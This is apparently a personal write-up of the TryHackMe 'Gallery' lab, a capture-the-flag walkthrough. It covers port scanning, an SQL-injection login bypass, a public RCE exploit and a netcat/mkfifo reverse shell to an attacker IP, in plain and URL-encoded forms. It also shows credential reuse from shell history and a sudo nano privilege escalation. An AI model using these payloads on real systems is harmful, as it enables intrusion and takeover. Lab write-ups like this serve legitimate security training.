---
title: Gallery
date: 2022-02-20
categories: [TryHackMe, Medim]
tags: [cms, exploit-db, linux]     # TAG names should always be lowercase
---

Official room [link](https://tryhackme.com/room/gallery666)

We first make a variable to hold our assign ip `export ip=10.10.62.114`

### Nmap result `nmap -sC -sV $ip`

```
Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-13 10:30 GMT
Nmap scan report for ip-10-10-62-114.eu-west-1.compute.internal (10.10.62.114)
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System
MAC Address: 02:45:AE:62:86:6F (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.91 seconds

```

### gobuster dir -u http://$ip -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.62.114
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/02/13 10:40:32 Starting gobuster
===============================================================
/gallery (Status: 301)
/server-status (Status: 403)
===============================================================
2022/02/13 10:40:56 Finished
==============================================================
```

### gobuster dir -u http://10.10.62.114/gallery -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.62.114/gallery
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/02/13 10:42:07 Starting gobuster
==========================================/images
/report (Status: 301)
/albums (Status: 301)
/plugins (Status: 301)
/database (Status: 301)
/classes (Status: 301)
/dist (Status: 301)
/inc (Status: 301)
/build (Status: 301)
/schedules (Status: 301)
===============================================================
2022/02/13 10:42:30 Finished
===============================================================

```

> ## Q1. How many ports are open?

- from our nmap result we can see there's 2 ports open, port 80, 8080

> ## Q2. Whats the name of the CMS?

- Also from the nmap scan we can see its Simple Image gallery

> ## Q3. What's the hash password of the admin user?

The flag `a228b12--------------914531c`

- This is a bit confusing, so i decided to dig abit on the CMS and see if
  there's any know vuln effecting to. At first i run the command
  `searchsploit simple image gallery` but unfortunently the result i got wasn't
  what I'm expecting. Seeing this make me think about our old friend google. I
  search it up and got [this](https://www.exploit-db.com/exploits/50214) from
  exploit-db. After you run the exploit it ask for target: i supply
  http://$ip/gallery. Boom it works like a charm, Now i have RCE on the server.
  I logged in to the cms with the payload `admin' or '1'='1'#` as username pass:
  null. then i navigate to /uploads where i found the file created by the
  exploit. i apply the payload and now i got a shell.

### php payload on the victim side

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker-ip> 4242 >/tmp/f
```

The above wasn't working and i dont know, i search it up a bit and i figure out
i need to url encode it. Here is the working one

### php payload on victim side working one

```php
rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.58.106%204444%20%3E%2Ftmp%2Ff
```

### attacker machine

`nc -nvlp 4444` <br> <br>

### stabilizing the shell

Now i can use ctrl + any character (You will see why this is important in a
minute)

```bash
victim: python3 -c 'import pty;pty.spawn("/bin/bash")'
victim: Ctrl + Z
attacker: stty raw -echo; fg
victim: export TERM=xterm
```

Navigating to /home we can see 2 users 1. Ubuntu 2. Mike, we cd into mike but we
cant read user.txt. so i navigate to /dev/shm and pull linpeas.sh and run it.
After linpeas.sh finished i saw an interesting history for the user mike
`sudo -lb3stpassw0rdbr0xx`, that was kinda funny haha, so i just do `su mike`
with the password: b3stpassw0rdbr0xx. now i can read the user.txt

> ## Q4. Whats the user flag?

`THM{af05cd............d546ef}`

Also looking at linpeas out put i saw the default db connection password for the
gallery in the initialize.php located at /var/www/html/gallery.

Conneting to mysql `mysql -u gallery_user -p` password: pass....321 give the
databse where i retrieve the flag 3. the admin hash password

```sql
show databases;
use gallery_db;
show tables;
select * from users;
```

> ## Q5. Whats the root flag

There's no hint for this, so i use run `sudo -l` as mike.

```bash
User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh

```

Now its time to inspect /opt/rootkit.sh

cat /opt/rootkit.sh

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac

```

So rootkit.sh is script simingly doing some sorta system update and stuff.
Looking at the read options i see we're calling /bin/nano /root/report.txt as
root. This grabs my attention pretty quick, as i know nano doesn't drop the
priv. So search it in gtfobins (who remember the commands anyways). running the
script as: `sudo /bin/bash /opt/rootkit.sh` give us options to choose, in the
beginning i know I'm only interested in the read read option. So i just enter
read. Now i have nano open with the report.txt. we can elevate our prive using
the below commands in nano.

### priv esc

```bash
^R ^X
reset; bash 1>&0 2>&0
```

Flag: `THM{ba87e0df..............bafde87}`

Thanks for reading hope this helps.
